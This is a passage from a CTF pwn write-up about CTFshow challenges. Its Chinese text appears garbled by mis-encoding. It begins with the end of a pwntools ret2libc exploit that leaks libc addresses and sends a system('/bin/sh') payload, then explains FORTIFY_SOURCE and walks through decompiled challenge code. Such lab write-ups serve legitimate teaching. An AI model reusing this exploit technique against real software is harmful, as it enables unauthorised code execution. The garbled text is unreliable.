</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;libc base: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;system address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;/bin/sh address: </span><span class="si">%#x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># è·å–å…³é”®åœ°å€</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># ä»ç¨‹åºç¬¦å·è¡¨è·å–writeå‡½æ•°çš„PLTåœ°å€ï¼ˆç”¨äºè°ƒç”¨ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>        <span class="c1"># ä»ç¨‹åºå…¨å±€åç§»è¡¨è·å–writeå‡½æ•°çš„GOTåœ°å€ï¼ˆå­˜å‚¨çœŸå®åœ°å€ï¼‰</span>
</span></span><span class="line"><span class="cl"><span class="n">ctfshow</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">]</span>        <span class="c1"># è·å–å­˜åœ¨æ ˆæº¢å‡ºçš„ctfshowå‡½æ•°åœ°å€ï¼ˆç”¨äºäºŒæ¬¡æº¢å‡ºï¼‰</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„åœ°å€æ˜¯å¯ä»¥æ‰‹å†™çš„ï¼Œä½†æˆ‘ä¸å»ºè®®ï¼ŒAIç»™çš„æ˜¯ç¡®åˆ‡åœ°å€ï¼Œè¿™é‡Œæˆ‘ç»™æ”¹äº†ï¼Œä¸‹æ¬¡AIå†™è„šæœ¬ï¼Œåœ°å€ä¸€å®šä¸è¦æ‰‹åŠ¨ç¡¬å†™å‡ºæ¥ï¼Œå¸®AIæ”¹ä¸€ä¸‹æ”¹æˆè‡ªåŠ¨è·å–çš„ï¼Œæ¯”å¦‚ä¸Šé¢è¿™æ ·ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è·å–åœ°å€çš„ï¼Œè¿™æ ·æ¯”è¾ƒå‡†ç¡®ä¸ä¼šå‡ºé”™å´©æºƒã€‚</p>
<p>è¯´å®è¯ï¼Œç»™æˆ‘è‚¯å®šå†™ä¸åˆ°çš„ï¼Œä¸ç†Ÿæ‚‰ç¼–å†™pythonè¿œç¨‹äº¤äº’è„šæœ¬ï¼Œä½†æˆ‘å¯ä»¥è¯»æ‡‚ï¼Œæˆ‘å¯ä»¥ç”¨AIå¸®æˆ‘å†™ä»£ç ï¼Œæˆ‘å°±æŠŠæ„æ„¿å‘Šè¯‰å®ƒï¼ŒæŠŠIDAæ±‡ç¼–ä»£ç ä»¥åŠè·Ÿè¿›çš„å‡½æ•°å¤åˆ¶å‘ç»™å®ƒï¼Œé™„ä¸Šæˆ‘çš„æ€è·¯ï¼Œä¸å¦‚å·²ç»çŸ¥é“æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´ç¼–å†™ret2libcã€çŸ¥é“å¼€å¯äº†å“ªäº›ä¿æŠ¤ã€ä¸€æ­¥æ­¥ä¿®æ”¹å¾—åˆ°çš„ã€‚</p>
<h3 id="pwn_031å¾…å®š">PWN_031ï¼ˆå¾…å®šï¼‰
</h3><p>é¢˜ç›®ï¼šå¼€å¯ ASLR å’Œ PIE çš„æƒ…å†µä¸‹ï¼Œä»å¯èƒ½è¢«åˆ©ç”¨ï¼› <a class="link" href="PWN_031" >PWN_031</a></p>
<p>checksecä¸€ä¸‹ï¼Œæ— æ ˆä¿æŠ¤ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/83.png"
	width="1153"
	height="201"
	srcset="/p/ctfshow-pwn-writeup/83_hu_7ff647734d8a0296.png 480w, /p/ctfshow-pwn-writeup/83_hu_441617b6b4ffee67.png 1024w"
	loading="lazy"
	
		alt="æ ˆæº¢å‡º"
	
	
		class="gallery-image" 
		data-flex-grow="573"
		data-flex-basis="1376px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/84.png"
	width="674"
	height="184"
	srcset="/p/ctfshow-pwn-writeup/84_hu_b9ac56fd6a862ae6.png 480w, /p/ctfshow-pwn-writeup/84_hu_3105db06c121094.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="366"
		data-flex-basis="879px"
	
></p>
<p>å‘ç°åŒæ ·çš„ä»£ç ï¼Œæœ‰æº¢å‡ºï¼Œä¼¼ä¹å¯ç”¨ä¸Šé¢˜çš„expï¼Œä¸è¿‡checksecçœ‹åˆ°çš„ä¿æŠ¤æ˜¯ä¸ä¸€æ ·çš„ï¼Œexpè‚¯å®šä¸ä¸€æ ·äº†&hellip;.</p>
<p>è¿è¡Œä¹‹åè«åå…¶å¦™ï¼Œä¼šæœ‰æŠ¥éšæœºåŒ–çš„åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/85.png"
	width="1055"
	height="680"
	srcset="/p/ctfshow-pwn-writeup/85_hu_164fbd871315e02a.png 480w, /p/ctfshow-pwn-writeup/85_hu_4528b5c9989ab6ae.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="155"
		data-flex-basis="372px"
	
></p>
<p>&hellip;..<a class="link" href="https://www.cnblogs.com/Claire-cat/articles/19030339"  target="_blank" rel="noopener"
    >æ·±å…¥åˆ†æCTFshow-PWNå…¥é—¨-pwn31çš„è§£æ³•ä¸åŸç† - Claire_cat - åšå®¢å›­</a></p>
<p>è¿™é¢˜å’ŒPWN_025å·®ä¸å¤šï¼Œæœ‰å…³æ ˆæº¢å‡ºçš„çŸ¥è¯†ç‚¹ï¼Œè¿™é‡Œå…ˆè·³&hellip;</p>
<h3 id="fortifyç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥"><strong>FORTIFYç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥</strong>
</h3><p><code>FORTIFY_SOURCE</code> æ˜¯ GCC æä¾›çš„ä¸€ç§è½»é‡çº§ç¼“å†²åŒºæº¢å‡ºä¿æŠ¤æœºåˆ¶ï¼Œé€šè¿‡å¯¹å±é™©å‡½æ•°ï¼ˆå¦‚ <code>strcpy</code>ã€<code>memcpy</code> ç­‰ï¼‰è¿›è¡Œå¢å¼ºæ£€æŸ¥ï¼Œé™ä½ç¼“å†²åŒºæº¢å‡ºæ¼æ´çš„åˆ©ç”¨é£é™©ã€‚å®ƒæœ‰ 3 ä¸ªçº§åˆ«ï¼š<code>_FORTIFY_SOURCE=0</code>ï¼ˆå…³é—­ï¼‰ã€<code>_FORTIFY_SOURCE=1</code>ï¼ˆåŸºç¡€ä¿æŠ¤ï¼‰ã€<code>_FORTIFY_SOURCE=2</code>ï¼ˆå¼ºåŒ–ä¿æŠ¤ï¼‰ï¼Œå„çº§åˆ«åŒºåˆ«å¦‚ä¸‹ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>çº§åˆ«</th>
          <th>å¯ç”¨æ¡ä»¶</th>
          <th>æ ¸å¿ƒæ£€æŸ¥é€»è¾‘</th>
          <th>é˜²æŠ¤èŒƒå›´</th>
          <th>æ€§èƒ½å½±å“</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0</td>
          <td>é»˜è®¤ï¼ˆæ— éœ€å®šä¹‰å®ï¼‰</td>
          <td>æ— ä»»ä½•æ£€æŸ¥ï¼Œä½¿ç”¨åŸå§‹å‡½æ•°</td>
          <td>æ— </td>
          <td>æ— </td>
      </tr>
      <tr>
          <td>1</td>
          <td>-D_FORTIFY_SOURCE=1 -O1</td>
          <td>æ£€æŸ¥ â€œæºé•¿åº¦ &lt; ç›®æ ‡ç¼“å†²åŒºé•¿åº¦â€ï¼ˆä»…é™ç¼–è¯‘æœŸå¯çŸ¥ï¼‰</td>
          <td>éƒ¨åˆ†é™æ€åœºæ™¯</td>
          <td>æå°</td>
      </tr>
      <tr>
          <td>2</td>
          <td>-D_FORTIFY_SOURCE=2 -O2</td>
          <td>æ£€æŸ¥ â€œæ“ä½œé•¿åº¦ â‰¤ ç›®æ ‡ç¼“å†²åŒºå®é™…å¤§å°â€ï¼ˆå«è¿è¡Œæ—¶ï¼‰</td>
          <td>é™æ€ + åŠ¨æ€åœºæ™¯ï¼Œè¦†ç›–æ›´å¤šå‡½æ•°</td>
          <td>è½»å¾®</td>
      </tr>
  </tbody>
</table></div>
<ul>
<li><code>FORTIFY_SOURCE</code> ä»…èƒ½é˜²æŠ¤éƒ¨åˆ†å·²çŸ¥çš„å±é™©å‡½æ•°ï¼Œæ— æ³•æ›¿ä»£ <code>NX</code>ã€<code>Stack Canary</code> ç­‰æ›´å…¨é¢çš„ä¿æŠ¤æœºåˆ¶ã€‚</li>
<li>å¿…é¡»é…åˆä¼˜åŒ–é€‰é¡¹ï¼ˆ<code>-O1</code>/<code>-O2</code>ï¼‰æ‰èƒ½ç”Ÿæ•ˆï¼Œå¦åˆ™ç¼–è¯‘å™¨ä¼šå¿½ç•¥è¯¥å®å®šä¹‰ã€‚</li>
<li>å¯¹äºåŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆå¦‚ <code>malloc</code> åˆ†é…çš„ç¼“å†²åŒºï¼‰ï¼Œ<code>FORTIFY_SOURCE</code> æ— æ³•è·å–å…¶å¤§å°ï¼Œå› æ­¤æ— æ³•é˜²æŠ¤ç›¸å…³æ“ä½œï¼ˆå¦‚ <code>memcpy(malloc_buf, src, n)</code>ï¼‰ã€‚</li>
</ul>
<h3 id="pwn_032">PWN_032
</h3><p>é¢˜ç›®ï¼šFORTIFY_SOURCE=0ï¼š</p>
<p>ç¦ç”¨ Fortify åŠŸèƒ½ã€‚ ä¸ä¼šè¿›è¡Œä»»ä½•é¢å¤–çš„å®‰å…¨æ£€æŸ¥ã€‚ å¯èƒ½å¯¼è‡´æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</p>
<p>è¿™é¢˜ä¸»è¦æ˜¯åœ¨å‡½æ•°é€»è¾‘è¿è¡Œï¼ŒçŸ¥é“è¿è¡Œçš„åŸç†å°±å¥½ã€‚</p>
<p>IDAåˆ†æmainï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/89.png"
	width="849"
	height="610"
	srcset="/p/ctfshow-pwn-writeup/89_hu_46351ba23fdd4185.png 480w, /p/ctfshow-pwn-writeup/89_hu_90e899f007f35973.png 1024w"
	loading="lazy"
	
		alt="main"
	
	
		class="gallery-image" 
		data-flex-grow="139"
		data-flex-basis="334px"
	
></p>
<p>è·Ÿè¿›undefinedå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/90.png"
	width="1305"
	height="355"
	srcset="/p/ctfshow-pwn-writeup/90_hu_973dd70d1193f96a.png 480w, /p/ctfshow-pwn-writeup/90_hu_8bf66355b5d6254e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="367"
		data-flex-basis="882px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå…³é”®åœ¨äºæˆåŠŸè¿›å…¥åˆ°undefinedå‡½æ•°æ‰æœ‰æœºä¼šä¸‹ä¸€æ­¥è·å¾—flagï¼š</p>
<p>ä»mainå‡½æ•°å‡ºå‘ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">__gid_t</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">num</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-44h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span> <span class="c1">// [rsp+Ah] [rbp-3Eh] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">buf1</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span> <span class="c1">// [rsp+15h] [rbp-33h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">getegid</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">setresgid</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">logo</span><span class="p">();</span>  
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">buf1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span><span class="p">;</span><span class="c1">//æŒ‡é’ˆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf1</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span><span class="c1">//æŒ‡é’ˆ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">buf1</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="n">v4</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="s">&#34;CTFshowPWN&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="n">buf2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="nf">strtol</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">v5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%s %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="n">buf2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="n">_bss_start</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">Undefined</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¤§è‡´æ˜¯ï¼šèµ·åˆå…ˆæ‰“å°ctfshowçš„logoä¿¡æ¯ï¼ˆå…¶å®ä¸€å¼€å§‹é‚£ä¸ªv3æŠŠæˆ‘ææ‡µäº†ï¼Œå…¶å®å¯¹è§£é¢˜è¿‡ç¨‹æ²¡å•¥å¸®åŠ©çš„ï¼‰ï¼Œåœ¨æœ€é¡¶ç«¯çš„__fastcall mainå·²ç»æŠŠä¸€äº›å‚æ•°ç»™å®šä¹‰äº†æ¯”å¦‚argvæ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå‚æ•°argv[1]è¢«èµ‹ç»™v4ï¼Œv4ä½œä¸­ä»‹æŠŠæ•°å€¼ä¼ é€’ç»™äº†buf1ï¼Œä¹‹åç¨‹åºå°†v4[10]æ•°ç»„å†…å®¹èµ‹å€¼ç»™buf1[10]ï¼Œæ¥ç€é€šè¿‡strcpyå‡½æ•°ï¼ŒæŠŠå­—ç¬¦ä¸²â€œCTFshowPWNâ€å¤åˆ¶/èµ‹å€¼ç»™buf2ï¼Œprintfæ‰“å°buf1ã€buf2çš„å½“å‰çš„å­—ç¬¦ä¸²å†…å®¹ï¼Œæœ€åfgetè¯»å–_bss_startçš„11ä¸ªå­—ç¬¦ç»™buf1ï¼Œæ‰“å°buf1å’Œnumçš„ä¿¡æ¯ï¼Œæœ€åé€šè¿‡ifåˆ¤æ–­argcæ˜¯å¦å¤§äº4(é»˜è®¤æƒ…å†µä¸‹argcæ˜¯ç­‰äº1çš„ï¼Œå› ä¸ºargv[0]å¿…å®šå­˜åœ¨ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå‚æ•°ï¼Œargcå°±ä¼šç­‰äº2ï¼Œä¾æ¬¡é€’æ¨)ï¼Œå¤§äº4å°±è¿›å…¥undefinedå‡½æ•°å†…</p>
<p>å› ä¸ºæœ¬é¢˜ç›®FORTIFY_SOURCEæ²¡æœ‰å¼€å¯ï¼Œä»£è¡¨æˆ‘ä»¬å¯åŠ¨å‡½æ•°ç›´æ¥è¾“å…¥4ä¸ªå‚æ•°(è¿™æ—¶argc=5 &gt; 4ï¼Œä¸ºä»€ä¹ˆäº”ä¸ªï¼Ÿå› ä¸ºä½ è¾“å…¥çš„4ä¸ª+argc[0] = 5)å°±è¡Œäº†ï¼Œè€Œä¸”è¿™4ä¸ªå‚æ•°æ²¡æœ‰é•¿åº¦é™åˆ¶ï¼Œå¦‚æœå¼€å¯FORTIFY_SOURCEå°±ä¸å¥½è¯´äº†ï¼Œå› ä¸ºå¼€å¯äº†ä¹‹åï¼Œç”±äºç¨‹åºå­˜åœ¨strcpyå’Œmemcpyå‡½æ•°ä¼šæ£€æµ‹é•¿åº¦ï¼Œå¦‚æœé•¿åº¦è¶…è¿‡äº†é™åˆ¶ï¼Œå¯èƒ½ä¼šä½¿ç¨‹åºæŠ›å‡ºå¼‚å¸¸è€Œé€€å‡ºæ‰§è¡Œã€‚</p>
<p><img src="/p/ctfshow-pwn-writeup/91.png"
	width="1400"
	height="756"
	srcset="/p/ctfshow-pwn-writeup/91_hu_15b7482435404dc9.png 480w, /p/ctfshow-pwn-writeup/91_hu_ba35ebc958987903.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="185"
		data-flex-basis="444px"
	
></p>
<h3 id="pwn_033">PWN_033
</h3><p>é¢˜ç›®ï¼šFORTIFY_SOURCE=1ï¼š</p>
<p>å¯ç”¨ Fortify åŠŸèƒ½çš„åŸºæœ¬çº§åˆ«ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œä¸€äº›å®‰å…¨æ£€æŸ¥ï¼Œå¦‚ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ£€æŸ¥ç­‰ã€‚ åœ¨è¿è¡Œæ—¶è¿›è¡ŒæŸäº›æ£€æŸ¥ï¼Œå¦‚æ£€æµ‹å‡½æ•°è¿”å›å€¼å’Œå¤§å°çš„ä¸€è‡´æ€§ã€‚ å¦‚æœæ£€æµ‹åˆ°æ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼Œä¼šè§¦å‘è¿è¡Œæ—¶é”™è¯¯ï¼Œå¹¶ç»ˆæ­¢ç¨‹åºæ‰§è¡Œã€‚ <a class="link" href="PWN_033" >PWN_033</a></p>
<hr>
<p>IDAx64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-pwn-writeup/92.png"
	width="890"
	height="575"
	srcset="/p/ctfshow-pwn-writeup/92_hu_b8d7b58369f7ed42.png 480w, /p/ctfshow-pwn-writeup/92_hu_5f64d4fe00dca924.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="154"
		data-flex-basis="371px"
	
></p>
<p>FORTIFY_SOURCEè¢«æ‰“å¼€äº†ï¼Œä»£ç å’ŒPWN_032å‡ ä¹ä¸€æ ·çš„ï¼Œmemcpyå’Œstrcpyè¿™ä¸¤ä¸ªå‡½æ•°è¢«æ›¿æ¢æˆäº†__mencpy_chkå’Œ__strcpy__chkå®‰å…¨å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸¤ä¸ªå‡½æ•°ç›¸æ¯”å‰ä¸¤ä¸ªå‡½æ•°åªæ˜¯åŠ ä¸Šäº†11LLè¿™ä¸ªå‚æ•°åŠ ä»¥é™åˆ¶ï¼Œå› ä¸ºbuf1å’Œbuf2åœ¨å£°æ˜çš„æ—¶å€™çš„é•¿åº¦å°±æ˜¯11ï¼Œæ‰€ä»¥ç¨‹åºä¸ºäº†é˜²æ­¢æº¢å‡ºï¼Œä½¿ç”¨åä¸¤ä¸ªå‡½æ•°åŠ ä¸Šè¿™ä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦åŠ ä»¥é™åˆ¶ä»¥é˜²æº¢å‡ºã€‚</p>
<p>ä½†è¿™ä¸å¦¨ç¢æˆ‘ä»¬æ‹¿flagå•Šï¼Œåªè¦è¿è¡Œ./pwnmeæ—¶è¾“å…¥çš„å­—ç¬¦æ€»é•¿åº¦ä¸è¶…è¿‡11å°±å¥½ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># argv[1] é•¿åº¦â‰¤10ï¼Œargv[3] â‰¤11ï¼Œæ€»å‚æ•°â‰¥5 </span>
</span></span><span class="line"><span class="cl">$./pwnme <span class="s2">&#34;short&#34;</span> <span class="s2">&#34;a&#34;</span> <span class="s2">&#34;5&#34;</span> <span class="s2">&#34;d&#34;</span> <span class="s2">&#34;e&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-pwn-writeup/93.png"
	width="1340"
	height="735"
	srcset="/p/ctfshow-pwn-writeup/93_hu_9f26a9108882b142.png 480w, /p/ctfshow-pwn-writeup/93_hu_c04b5083116f2c7c.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="182"
		data-flex-basis="437px"
	
></p>
<h3 id="pwn_034">PWN_034
</h3><p>é¢˜ç›®ï¼šFORTIFY_SOURCE=2ï¼š</p>
<p>å¯ç”¨ Fortify åŠŸèƒ½çš„é«˜çº§çº§åˆ«ã€‚ åŒ…æ‹¬åŸºæœ¬çº§åˆ«çš„å®‰å…¨æ£€æŸ¥ï¼Œå¹¶æ·»åŠ äº†æ›´å¤šçš„æ£€æŸ¥ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå¦‚æ›´ç²¾ç¡®çš„ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€‚ æä¾›æ›´ä¸°å¯Œçš„ç¼–è¯‘å™¨è­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯ã€‚</p>
<hr>
<p>IDAåˆ†æï¼Œé¢˜ç›®æè¿°ä¹Ÿè¯´äº†è¯¥ç¨‹åºåŒ…æ‹¬åŸºæœ¬çº§åˆ«çš„å®‰å…¨æ£€æŸ¥ï¼Œå¹¶æ·»åŠ äº†æ›´å¤šçš„æ£€æŸ¥ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå¦‚æ›´ç²¾ç¡®çš„ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€‚ æä¾›æ›´ä¸°å¯Œçš„ç¼–è¯‘å™¨è­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯ã€‚
